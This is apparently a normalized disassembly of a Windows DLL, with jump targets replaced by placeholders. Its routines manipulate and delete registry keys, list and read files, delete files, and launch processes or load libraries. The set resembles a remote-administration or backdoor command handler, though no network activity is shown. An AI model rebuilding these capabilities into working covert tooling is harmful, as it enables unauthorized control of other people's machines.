mov al [ ebx + ecx ]
mov ecx [ ebp + ecx * 4 ]
mov [ edx ] al
mov eax esi
inc edx
inc esi
cmp eax 0xffe
jge r-xdata
jmp r-xdata
xor esi esi
cmp edi [ esp + 0x14 ]
jb r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x14
retn
cmp edx rw-data
jae r-xdata
dec edx
test ecx ecx
jl r-xdata
mov ecx [ eax + 0x8 ]
cmp esi ecx
jg r-xdata
sub_100085e0
mov edx [ rw-data ]
cmp edx 0x18
push ebx
mov ebx [ rw-data ]
jg r-xdata
mov eax ebx
shl ebx 0xc
sub edx 0xc
mov [ rw-data ] ebx
shr eax 0x14
mov [ rw-data ] edx
pop ebx
retn
push ebp
mov ebp [ edi + 0x4 ]
push esi
mov esi [ edi + 0x8 ]
lea ebx [ ebx ]
mov eax [ edi ]
movzx eax [ eax + esi ]
inc esi
or eax 0xffffffff
jmp r-xdata
cmp ebp esi
jg r-xdata
mov [ edi + 0x8 ] esi
pop esi
pop ebp
mov ecx 0x18
sub ecx edx
shl eax cl
add edx 0x8
or ebx eax
cmp edx 0x18
jle r-xdata
sub_10008650
mov edx [ rw-data ]
mov ecx 0x14
sub ecx edx
push ebx
shl eax cl
push ebp
push edi
mov edi [ rw-data ]
add edx 0xc
or edi eax
cmp edx 0x8
mov [ rw-data ] edi
mov [ rw-data ] edx
jl r-xdata
pop edi
pop ebp
xor eax eax
pop ebx
retn
mov ebp [ esi + 0x4 ]
mov [ rw-data ] edi
pop edi
pop ebp
mov [ rw-data ] edx
or eax 0xffffffff
pop ebx
retn
mov ebx [ esi ]
mov ecx edi
shr ecx 0x18
mov [ eax + ebx ] cl
inc eax
sub edx 0x8
shl edi 0x8
cmp edx 0x8
mov [ esi + 0x8 ] eax
jge r-xdata
mov eax [ esi + 0x8 ]
cmp ebp eax
jle r-xdata
mov [ rw-data ] edx
mov [ rw-data ] edi
sub_100086d0
sub esp 0x8
push edi
lea ecx [ esp + 0x4 ]
push ecx
mov ecx [ esp + 0x14 ]
push edx
mov edx [ esi ]
mov [ esp + 0xc ] eax
lea eax [ esp + 0x10 ]
push eax
push 0x0
push ecx
push edx
mov [ esp + 0x20 ] 0x1
call [ RegQueryValueExA@IAT ]
mov edi eax
mov eax [ esi ]
push eax
call [ RegCloseKey@IAT ]
xor eax eax
test edi edi
sete al
pop edi
add esp 0x8
retn
sub_10008720
sub esp 0x8
push esi
mov esi eax
lea eax [ esp + 0x4 ]
push eax
push 0xf003f
push 0x0
push esi
push edi
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov eax ebx
lea edx [ eax + 0x1 ]
lea ecx [ esp + 0x8 ]
push ecx
lea edx [ esp + 0x8 ]
push edx
push 0x0
push 0xf003f
push 0x0
push r--data
push 0x0
push esi
push edi
mov [ esp + 0x2c ] 0x1
call [ RegCreateKeyExA@IAT ]
test eax eax
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ esp + 0x4 ]
sub eax edx
push eax
mov eax [ esp + 0x14 ]
push ebx
push 0x1
push 0x0
push eax
push ecx
call [ RegSetValueExA@IAT ]
mov edx [ esp + 0x4 ]
push edx
mov esi eax
call [ RegCloseKey@IAT ]
xor eax eax
test esi esi
sete al
pop esi
add esp 0x8
retn
xor eax eax
pop esi
add esp 0x8
retn
sub_100087b0
sub esp 0x8
push esi
mov esi eax
lea eax [ esp + 0x4 ]
push eax
push 0xf003f
push 0x0
push esi
push 0x80000001
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov eax edi
lea edx [ eax + 0x1 ]
lea ecx [ esp + 0x8 ]
push ecx
lea edx [ esp + 0x8 ]
push edx
push 0x0
push 0xf003f
push 0x0
push r--data
push 0x0
push esi
push 0x80000001
mov [ esp + 0x2c ] 0x1
call [ RegCreateKeyExA@IAT ]
test eax eax
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ esp + 0x4 ]
sub eax edx
push eax
mov eax [ esp + 0x14 ]
push edi
push 0x2
push 0x0
push eax
push ecx
call [ RegSetValueExA@IAT ]
mov edx [ esp + 0x4 ]
push edx
mov esi eax
call [ RegCloseKey@IAT ]
xor eax eax
test esi esi
sete al
pop esi
add esp 0x8
retn
xor eax eax
pop esi
add esp 0x8
retn
sub_10008850
sub esp 0x8
push esi
mov esi eax
lea eax [ esp + 0x4 ]
push eax
push 0xf003f
push 0x0
push esi
push edi
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x4 ]
push 0x4
lea eax [ esp + 0x18 ]
push eax
push 0x4
push 0x0
push ecx
push edx
call [ RegSetValueExA@IAT ]
mov esi eax
mov eax [ esp + 0x4 ]
push eax
call [ RegCloseKey@IAT ]
xor eax eax
test esi esi
sete al
pop esi
add esp 0x8
retn
lea ecx [ esp + 0x8 ]
push ecx
lea edx [ esp + 0x8 ]
push edx
push 0x0
push 0xf003f
push 0x0
push r--data
push 0x0
push esi
push edi
mov [ esp + 0x2c ] 0x1
call [ RegCreateKeyExA@IAT ]
test eax eax
je r-xdata
xor eax eax
pop esi
add esp 0x8
retn
sub_100088e0
sub esp 0x10c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x108 ] eax
push ebp
mov ebp [ esp + 0x114 ]
push edi
mov edi [ esp + 0x11c ]
test edi edi
jne r-xdata
mov eax edi
lea edx [ eax + 0x1 ]
pop edi
xor eax eax
pop ebp
mov ecx [ esp + 0x108 ]
xor ecx esp
call sub_1000c176
add esp 0x10c
retn
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
lea eax [ esp + 0x8 ]
push eax
push 0x10008
push 0x0
push edi
push ebp
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
push esi
mov esi [ RegEnumKeyExA@IAT ]
push eax
push eax
push eax
push eax
lea ecx [ esp + 0x20 ]
push ecx
lea edx [ esp + 0x28 ]
push edx
push eax
mov eax [ esp + 0x28 ]
push eax
mov [ esp + 0x30 ] 0x100
call esi
test eax eax
jne r-xdata
mov ecx [ esp + 0xc ]
push ecx
call [ RegCloseKey@IAT ]
push edi
push ebp
call [ RegDeleteKeyA@IAT ]
neg eax
pop esi
sbb eax eax
pop edi
inc eax
pop ebp
mov ecx [ esp + 0x108 ]
xor ecx esp
call sub_1000c176
add esp 0x10c
retn
mov edx [ esp + 0xc ]
lea ecx [ esp + 0x14 ]
push ecx
push edx
call sub_100088e0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
push eax
call [ RegCloseKey@IAT ]
mov ecx [ esp + 0x114 ]
pop esi
pop edi
pop ebp
xor ecx esp
xor eax eax
call sub_1000c176
add esp 0x10c
retn
mov edx [ esp + 0xc ]
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x20 ]
push eax
lea ecx [ esp + 0x28 ]
push ecx
push 0x0
push edx
mov [ esp + 0x30 ] 0x100
call esi
test eax eax
je r-xdata
sub_10008a10
push r--data
push esi
call sub_1000ebbe
add esp 0x8
test eax eax
jne r-xdata
push r--data
push esi
call sub_1000ebbe
add esp 0x8
test eax eax
jne r-xdata
mov eax 0x80000001
retn
push r--data
push esi
call sub_1000ebbe
add esp 0x8
test eax eax
jne r-xdata
mov eax 0x80000002
retn
push r--data
push esi
call sub_1000ebbe
add esp 0x8
test eax eax
jne r-xdata
mov eax 0x80000000
retn
push r--data
push esi
call sub_1000ebbe
add esp 0x8
test eax eax
jne r-xdata
mov eax 0x80000003
retn
push r--data
push esi
call sub_1000ebbe
add esp 0x8
test eax eax
je r-xdata
mov eax 0x80000005
retn
push r--data
push esi
call sub_1000ebbe
add esp 0x8
test eax eax
je r-xdata
push r--data
push esi
call sub_1000ebbe
add esp 0x8
neg eax
sbb eax eax
and eax 0x80000000
add eax 0x80000000
retn
sub_10008ac9
push ebp
mov ebp esp
sub esp 0x36c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
push 0x103
mov [ ebp - 0x35c ] eax
lea eax [ ebp - 0x14f ]
push 0x0
push eax
mov [ ebp - 0x150 ] 0x0
call sub_1000ebe0
mov eax [ ebp + 0x8 ]
lea ebx [ ebp - 0x150 ]
add esp 0xc
sub ebx eax
mov cl [ eax ]
mov [ ebx + eax ] cl
inc eax
test cl cl
jne r-xdata
lea eax [ ebp - 0x150 ]
push 0x2a
push eax
call sub_1000ef6b
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x358 ]
push eax
lea eax [ ebp - 0x150 ]
push eax
call [ FindFirstFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
lea edi [ ebp - 0x150 ]
dec edi
mov esi [ ebp - 0x35c ]
push r--data
call sub_1000b760
pop ecx
or eax 0xffffffff
mov eax [ ebp - 0x358 ]
mov cl al
and cl 0x20
neg cl
sbb cl cl
and cl 0x34
add cl 0x2d
mov [ ebp - 0x10 ] cl
mov ecx eax
and ecx 0x10
setne dl
dec dl
and dl 0xc9
add dl 0x64
mov [ ebp - 0xf ] dl
mov dl al
and dl 0x2
neg dl
sbb dl dl
and dl 0x3b
add dl 0x2d
test ecx ecx
setne cl
dec cl
and al 0x4
and cl 0xbb
add cl 0x72
neg al
sbb al al
and al 0x46
add al 0x2d
mov [ ebp - 0xc ] al
lea eax [ ebp - 0x36c ]
push eax
lea eax [ ebp - 0x344 ]
push eax
mov [ ebp - 0xe ] dl
mov [ ebp - 0xd ] cl
mov [ ebp - 0xb ] 0x0
call [ FileTimeToSystemTime@IAT ]
movzx eax [ ebp - 0x362 ]
push eax
movzx eax [ ebp - 0x364 ]
push eax
movzx eax [ ebp - 0x366 ]
push eax
movzx eax [ ebp - 0x36a ]
push eax
movzx eax [ ebp - 0x36c ]
push eax
lea eax [ ebp - 0x44 ]
push r--data
push eax
call sub_1000c36c
lea eax [ ebp - 0x44 ]
add esp 0x1c
xor esi esi
lea ecx [ eax + 0x1 ]
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
lea eax [ ebp - 0x358 ]
movsw [ edi ] [ esi ]
push eax
lea eax [ ebp - 0x150 ]
push eax
movsb [ edi ] [ esi ]
call [ FindFirstFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
test eax eax
jle r-xdata
mov eax [ ebp + 0x8 ]
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x338 ]
lea eax [ ebp - 0x32c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x218 ]
push r--data
push eax
mov [ ebp - 0x3a ] 0x20
call sub_1000c36c
mov esi [ ebp - 0x35c ]
lea eax [ ebp - 0x218 ]
push eax
push r--data
call sub_1000b760
add esp 0x20
lea eax [ ebp - 0x358 ]
push eax
push edi
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp + esi - 0x44 ]
cmp [ eax ] 0x20
jne r-xdata
mov cl [ eax ]
mov [ ebx + eax ] cl
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0x150 ]
dec edi
push edi
call [ FindClose@IAT ]
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x44 ]
inc esi
lea edx [ eax + 0x1 ]
mov [ eax ] 0x30
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
movsw [ edi ] [ esi ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c176
leave
retn
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp esi eax
jl r-xdata
sub_10008d0a
push ebp
mov ebp esp
sub esp 0x374
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov [ ebp - 0x35c ] eax
mov eax [ ebp + 0xc ]
mov edi 0x103
xor ebx ebx
push edi
mov [ ebp - 0x370 ] eax
lea eax [ ebp - 0x217 ]
push ebx
push eax
mov esi ecx
mov [ ebp - 0x218 ] bl
call sub_1000ebe0
add esp 0xc
push edi
lea eax [ ebp - 0x10f ]
push ebx
push eax
mov [ ebp - 0x110 ] bl
call sub_1000ebe0
mov eax sub_10002230
add esp 0xc
test eax eax
je r-xdata
or eax 0xffffffff
lea edi [ ebp - 0x218 ]
call sub_10007ba0
mov eax edi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
jne r-xdata
lea eax [ ebp - 0x358 ]
push eax
push esi
call [ FindFirstFileA@IAT ]
mov [ ebp - 0x360 ] eax
cmp eax 0xffffffff
je r-xdata
push 0x2e
pop eax
mov [ ebp - 0x218 ] ax
mov esi [ ebp - 0x35c ]
push r--data
call sub_1000b760
pop ecx
mov edi [ FindNextFileA@IAT ]
push ebx
push esi
call [ GetFileSize@IAT ]
push eax
mov [ ebp - 0x368 ] eax
call sub_1000cef2
pop ecx
mov [ ebp - 0x36c ] eax
cmp eax ebx
jne r-xdata
mov esi [ ebp - 0x35c ]
lea eax [ ebp - 0x110 ]
push eax
push r--data
call sub_1000b760
pop ecx
jmp r-xdata
push ebx
push ebx
push ebx
push esi
call [ SetFilePointer@IAT ]
push ebx
lea eax [ ebp - 0x368 ]
push eax
push [ ebp - 0x368 ]
push [ ebp - 0x36c ]
push esi
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov esi [ ebp - 0x35c ]
lea eax [ ebp - 0x110 ]
push eax
push r--data
call sub_1000b760
pop ecx
pop ecx
push [ ebp - 0x364 ]
call [ CloseHandle@IAT ]
jmp r-xdata
pop ecx
push [ ebp - 0x364 ]
call [ CloseHandle@IAT ]
push [ ebp - 0x36c ]
call sub_1000c3e9
mov ecx [ ebp - 0x368 ]
mov edx [ ebp - 0x36c ]
lea eax [ ebp - 0x32c ]
push eax
push [ ebp - 0x370 ]
call sub_1000a68d
mov esi [ ebp - 0x35c ]
pop ecx
test eax eax
pop ecx
lea eax [ ebp - 0x110 ]
push eax
jge r-xdata
lea eax [ ebp - 0x358 ]
push eax
push [ ebp - 0x360 ]
call edi
test eax eax
jne r-xdata
lea eax [ ebp - 0x32c ]
push eax
lea eax [ ebp - 0x218 ]
push eax
lea eax [ ebp - 0x110 ]
push r--data
push eax
call sub_1000c36c
add esp 0x10
push ebx
push 0x80
push 0x3
push ebx
push ebx
push 0x80000000
lea eax [ ebp - 0x110 ]
push eax
call [ CreateFileA@IAT ]
mov esi eax
mov [ ebp - 0x364 ] esi
cmp esi 0xffffffff
jne r-xdata
push [ ebp - 0x360 ]
call [ FindClose@IAT ]
xor eax eax
jmp r-xdata
push r--data
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c176
leave
retn
call sub_1000b760
pop ecx
pop ecx
sub_10008f3e
push ebp
mov ebp esp
sub esp 0x368
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi 0x103
xor ebx ebx
push edi
mov [ ebp - 0x360 ] eax
lea eax [ ebp - 0x21b ]
push ebx
push eax
mov esi ecx
mov [ ebp - 0x21c ] bl
call sub_1000ebe0
push edi
lea eax [ ebp - 0x113 ]
push ebx
push eax
mov [ ebp - 0x114 ] bl
call sub_1000ebe0
add esp 0x18
lea edi [ ebp - 0x21c ]
call sub_10007ba0
mov eax edi
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
jne r-xdata
lea eax [ ebp - 0x35c ]
push eax
push esi
call [ FindFirstFileA@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
push 0x2e
pop eax
mov [ ebp - 0x21c ] ax
mov esi [ ebp - 0x360 ]
push r--data
call sub_1000b760
pop ecx
or eax 0xffffffff
mov edi r--data
mov esi [ ebp - 0x360 ]
call [ DeleteFileA@IAT ]
mov esi [ ebp - 0x360 ]
test eax eax
lea eax [ ebp - 0x114 ]
push eax
je r-xdata
lea eax [ ebp - 0x330 ]
push eax
lea eax [ ebp - 0x21c ]
push eax
lea eax [ ebp - 0x114 ]
push r--data
push eax
call sub_1000c36c
add esp 0x10
lea esi [ ebp - 0x114 ]
call sub_10007f00
test eax eax
mov eax esi
push eax
jne r-xdata
push ebx
call [ FindClose@IAT ]
xor eax eax
jmp r-xdata
push edi
push r--data
jmp r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c176
leave
retn
call sub_1000b760
pop ecx
pop ecx
lea eax [ ebp - 0x35c ]
push eax
push ebx
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
sub_10009074
push ebp
mov ebp esp
sub esp 0x27c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov esi ecx
push 0x104
lea eax [ ebp - 0x218 ]
mov edi edx
push esi
push eax
mov [ ebp - 0x21c ] edi
call sub_1000c4b0
add esp 0xc
cmp [ ebp - 0x218 ] 0x22
lea eax [ ebp - 0x218 ]
jne r-xdata
push r--data
push eax
call sub_1000c5d4
pop ecx
pop ecx
lea edx [ ebp - 0x110 ]
xor ebx ebx
push r--data
push eax
call sub_1000c5d4
pop ecx
pop ecx
lea edx [ ebp - 0x110 ]
xor ebx ebx
mov cl [ eax ]
inc eax
mov [ edx ] cl
inc edx
cmp cl bl
jne r-xdata
lea eax [ ebp - 0x110 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
mov [ edx ] cl
inc edx
cmp cl bl
jne r-xdata
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
or eax 0xffffffff
lea eax [ ebp - 0x110 ]
push 0x2e
push eax
call sub_1000d460
pop ecx
pop ecx
cmp eax ebx
je r-xdata
push 0x44
pop edi
push edi
lea eax [ ebp - 0x278 ]
push ebx
push eax
call sub_1000ebe0
mov [ ebp - 0x278 ] edi
xor eax eax
lea edi [ ebp - 0x230 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
add esp 0xc
stosd [ edi ]
xor eax eax
mov [ ebp - 0x248 ] ax
lea eax [ ebp - 0x230 ]
push eax
lea eax [ ebp - 0x278 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push esi
push ebx
mov [ ebp - 0x24c ] 0x1
call [ CreateProcessA@IAT ]
mov esi [ ebp - 0x21c ]
jmp r-xdata
push r--data
push eax
call sub_1000c31a
pop ecx
pop ecx
test eax eax
jne r-xdata
test eax eax
je r-xdata
push esi
call [ LoadLibraryA@IAT ]
mov esi edi
push r--data
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c176
leave
retn
call sub_1000b760
pop ecx
xor eax eax
jmp r-xdata
sub_100091c7
push ebp
mov ebp esp
sub esp 0x220
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi 0x103
xor ebx ebx
push esi
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0x10f ]
push ebx
push eax
mov edi ecx
mov [ ebp - 0x110 ] bl
call sub_1000ebe0
add esp 0xc
push esi
lea eax [ ebp - 0x217 ]
push ebx
push eax
mov [ ebp - 0x218 ] bl
call sub_1000ebe0
add esp 0xc
mov esi r--data
push esi
push edi
call sub_1000e2b4
pop ecx
pop ecx
cmp eax ebx
je r-xdata
push esi
push ebx
call sub_1000e2b4
pop ecx
pop ecx
cmp eax ebx
je r-xdata
call sub_10007b20
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x218 ]
lea edx [ eax + 0x1 ]
call sub_10007b20
lea edx [ ebp - 0x218 ]
mov cl [ eax ]
inc eax
mov [ edx ] cl
inc edx
cmp cl bl
jne r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
jne r-xdata
mov cl [ eax ]
inc eax
mov [ edx ] cl
inc edx
cmp cl bl
jne r-xdata
lea eax [ ebp - 0x110 ]
lea edx [ eax + 0x1 ]
mov esi [ ebp - 0x21c ]
push r--data
call sub_1000b760
pop ecx
or eax 0xffffffff
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
cmp [ ebp + eax - 0x110 ] 0x5c
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c176
leave
retn
lea eax [ ebp - 0x218 ]
push eax
lea eax [ ebp - 0x110 ]
push eax
push [ ebp - 0x21c ]
call sub_100092ef
add esp 0xc
xor eax eax
lea edi [ ebp - 0x110 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
mov esi r--data
movsw [ edi ] [ esi ]
sub_100092ef
push ebp
mov ebp esp
sub esp 0x260
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x258 ] eax
mov eax [ ebp + 0x10 ]
push esi
lea ecx [ ebp - 0x114 ]
mov [ ebp - 0x25c ] eax
push edi
mov eax ebx
sub ecx ebx
mov dl [ eax ]
mov [ ecx + eax ] dl
inc eax
test dl dl
jne r-xdata
lea edi [ ebp - 0x114 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
lea eax [ ebp - 0x254 ]
push eax
lea eax [ ebp - 0x114 ]
mov esi r--data
push eax
movsw [ edi ] [ esi ]
call [ FindFirstFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
push edi
call [ FindClose@IAT ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c176
leave
retn
test [ ebp - 0x254 ] 0x10
lea eax [ ebp - 0x228 ]
je r-xdata
push [ ebp - 0x25c ]
push eax
call sub_1000ee98
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push eax
call sub_1000e27c
pop ecx
pop ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x254 ]
push eax
push edi
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
mov esi [ ebp - 0x258 ]
lea eax [ ebp - 0x228 ]
push eax
push ebx
push r--data
call sub_1000b760
add esp 0xc
lea eax [ ebp - 0x228 ]
push r--data
push eax
call sub_1000e27c
pop ecx
pop ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x228 ]
push eax
push ebx
lea eax [ ebp - 0x114 ]
push r--data
push eax
call sub_1000c36c
push [ ebp - 0x25c ]
lea eax [ ebp - 0x114 ]
push eax
push [ ebp - 0x258 ]
call sub_100092ef
add esp 0x1c
jmp r-xdata
sub_10009429
push ebp
mov ebp esp
sub esp 0x560
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi 0x103
xor ebx ebx
push esi
mov [ ebp - 0x53c ] eax
lea eax [ ebp - 0x21b ]
push ebx
push eax
mov edi ecx
mov [ ebp - 0x21c ] bl
call sub_1000ebe0
push esi
lea eax [ ebp - 0x113 ]
push ebx
push eax
mov [ ebp - 0x114 ] bl
call sub_1000ebe0
push esi
lea eax [ ebp - 0x42b ]
push ebx
push eax
mov [ ebp - 0x42c ] bl
call sub_1000ebe0
push 0x3
push r--data
push edi
mov [ ebp - 0x54c ] ebx
mov [ ebp - 0x540 ] ebx
call sub_1000e13b
add esp 0x30
test eax eax
jne r-xdata
push 0x3
pop esi
push esi
push r--data
push edi
call sub_1000e13b
add esp 0xc
test eax eax
jne r-xdata
mov [ ebp - 0x538 ] 0x1
jmp r-xdata
push esi
push r--data
push edi
call sub_1000e13b
add esp 0xc
test eax eax
jne r-xdata
mov [ ebp - 0x538 ] 0x2
jmp r-xdata
mov esi r--data
push esi
add edi 0x3
push edi
call sub_1000e2b4
pop ecx
pop ecx
cmp eax ebx
je r-xdata
push esi
push r--data
push edi
call sub_1000e13b
add esp 0xc
test eax eax
jne r-xdata
mov [ ebp - 0x538 ] esi
jmp r-xdata
push esi
push ebx
call sub_1000e2b4
pop ecx
pop ecx
cmp eax ebx
je r-xdata
call sub_10007b20
lea edx [ ebp - 0x21c ]
push 0x2
push r--data
push edi
call sub_1000e13b
add esp 0xc
test eax eax
jne r-xdata
mov [ ebp - 0x538 ] 0x4
jmp r-xdata
push esi
push ebx
call sub_1000e2b4
pop ecx
pop ecx
cmp eax ebx
je r-xdata
call sub_10007b20
lea edx [ ebp - 0x114 ]
mov cl [ eax ]
inc eax
mov [ edx ] cl
inc edx
cmp cl bl
jne r-xdata
push r--data
mov [ ebp - 0x538 ] 0x5
lea eax [ ebp - 0x42c ]
lea edx [ eax + 0x1 ]
call sub_10007b20
lea edx [ ebp - 0x42c ]
mov cl [ eax ]
inc eax
mov [ edx ] cl
inc edx
cmp cl bl
jne r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
jne r-xdata
mov cl [ eax ]
inc eax
mov [ edx ] cl
inc edx
cmp cl bl
jne r-xdata
cmp [ ebp - 0x538 ] 0x3
je r-xdata
cmp [ ebp - 0x538 ] 0x3
je r-xdata
xor eax eax
cmp [ ebp - 0x538 ] 0x4
jne r-xdata
cmp [ ebp - 0x538 ] 0x4
jne r-xdata
mov cl [ ebp + eax - 0x21c ]
mov [ ebp + eax - 0x324 ] cl
inc eax
cmp cl bl
jne r-xdata
lea eax [ ebp - 0x324 ]
push r--data
push eax
call sub_1000e2b4
pop ecx
pop ecx
lea edx [ ebp - 0x534 ]
mov cl [ eax ]
inc eax
mov [ edx ] cl
inc edx
cmp cl bl
jne r-xdata
lea eax [ ebp - 0x534 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
lea eax [ ebp + eax - 0x21b ]
lea esi [ ebp - 0x21c ]
sub esi eax
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
cmp cl bl
jne r-xdata
lea esi [ ebp - 0x534 ]
call sub_10008a10
mov edi eax
movzx eax [ ebp - 0x538 ]
dec eax
mov [ ebp - 0x544 ] edi
je r-xdata
lea eax [ ebp - 0x538 ]
push eax
push 0x20019
push ebx
lea eax [ ebp - 0x21c ]
push eax
push edi
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
dec eax
je r-xdata
mov esi [ ebp - 0x53c ]
push 0x4
pop eax
mov [ ebp - 0x550 ] eax
mov [ ebp - 0x554 ] eax
lea eax [ ebp - 0x554 ]
push eax
lea eax [ ebp - 0x54c ]
push eax
lea eax [ ebp - 0x550 ]
push eax
push ebx
lea eax [ ebp - 0x114 ]
push eax
push [ ebp - 0x538 ]
call [ RegQueryValueExA@IAT ]
push [ ebp - 0x538 ]
mov esi eax
call [ RegCloseKey@IAT ]
xor eax eax
cmp esi ebx
sete al
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x114 ]
lea edx [ eax + 0x1 ]
dec eax
je r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c176
leave
retn
push [ ebp - 0x54c ]
push r--data
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
jne r-xdata
lea eax [ ebp - 0x42c ]
push eax
call sub_1000d698
mov edi [ ebp - 0x544 ]
push eax
mov [ ebp - 0x54c ] eax
lea eax [ ebp - 0x114 ]
push eax
lea eax [ ebp - 0x21c ]
call sub_10008850
add esp 0xc
jmp r-xdata
dec eax
je r-xdata
mov esi [ ebp - 0x53c ]
call sub_1000b760
pop ecx
jmp r-xdata
lea eax [ ebp - 0x538 ]
push eax
push 0x20019
push ebx
lea eax [ ebp - 0x21c ]
push eax
push edi
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x544 ]
push eax
push 0xf003f
push ebx
lea eax [ ebp - 0x21c ]
push eax
push edi
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov esi [ ebp - 0x53c ]
test eax eax
je r-xdata
lea eax [ ebp - 0x114 ]
push eax
lea ebx [ ebp - 0x42c ]
lea eax [ ebp - 0x21c ]
call sub_10008720
jmp r-xdata
dec eax
jne r-xdata
pop ecx
lea eax [ ebp - 0x114 ]
push eax
lea esi [ ebp - 0x538 ]
mov eax 0x104
lea edx [ ebp - 0x42c ]
call sub_100086d0
pop ecx
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x55c ]
push eax
push ebx
push ebx
push ebx
lea eax [ ebp - 0x540 ]
push eax
lea eax [ ebp - 0x322 ]
push eax
mov [ ebp - 0x538 ] ebx
push ebx
jmp r-xdata
push r--data
jmp r-xdata
push r--data
push r--data
jmp r-xdata
pop ecx
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x114 ]
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x42c ]
push eax
push r--data
push [ ebp - 0x544 ]
lea edi [ ebp - 0x324 ]
mov esi r--data
movsw [ edi ] [ esi ]
mov [ ebp - 0x540 ] 0x102
movsb [ edi ] [ esi ]
call [ RegEnumKeyExA@IAT ]
test eax eax
je r-xdata
mov esi [ ebp - 0x53c ]
call sub_1000b760
or eax 0xffffffff
pop ecx
call sub_1000b760
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
jne r-xdata
